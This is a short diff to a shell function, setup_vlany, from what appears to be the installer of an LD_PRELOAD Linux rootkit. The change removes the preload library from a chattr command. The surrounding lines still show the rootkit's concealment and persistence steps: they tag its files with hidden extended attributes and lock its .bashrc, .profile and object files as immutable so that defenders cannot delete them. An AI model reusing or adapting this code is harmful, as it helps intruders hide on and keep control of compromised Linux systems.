@@ -296,7 +296,7 @@ setup_vlany ()
     # protect files and directories
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $NEW_PRELOAD
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL $INSTALL/* $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information
-    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* $NEW_PRELOAD
+    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}*
 }
 
 if [ "$1" == "--cli" ]; then
